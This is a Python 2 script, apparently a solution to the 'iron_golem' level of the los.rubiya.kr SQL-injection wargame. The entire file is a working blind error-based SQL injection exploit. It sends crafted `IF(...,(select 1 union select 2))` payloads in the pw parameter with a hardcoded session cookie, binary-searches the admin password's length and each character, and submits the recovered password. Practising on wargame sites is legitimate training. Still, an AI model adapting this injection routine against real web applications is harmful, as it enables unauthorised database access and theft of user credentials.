#!/usr/bin/env python

import urllib
import urllib2
import sys

URL = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=o4js9lcvfjuu3tts6juitjlido"


def query(Q):
    # print urllib.quote(Q)
    UURL = URL + "?pw=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)
    text = res.read()
    if "location.href" in text:
        print "Session expired..."
        sys.exit()
        
    return "<hr>" in text

def find_length():
    left = 0
    right = 200 # (left, right]
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("123' or id='admin' and IF(length(pw) > {},1,(select 1 union select 2))-- ".format(mid)):
            left = mid+1
        else:
            right = mid
    return right

def find_ch(pos):
    print "Finding pos {} th character".format(pos)
    left = 0
    right = (1<<8)
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("123' or id='admin' and IF(ascii(substr(pw,{},1))>{},1,(select 1 union select 2))-- ".format(pos, mid)):
            left = mid+1
        else:
            right = mid
    print "COOL!! {} = {}".format(pos, right)
    return right

LENGTH = find_length()
print "LENGTH = {}".format(LENGTH)
PASSWORD = ""
for i in range(1, LENGTH+1):
    PASSWORD += chr(find_ch(i))
    print PASSWORD

print PASSWORD

query(PASSWORD)
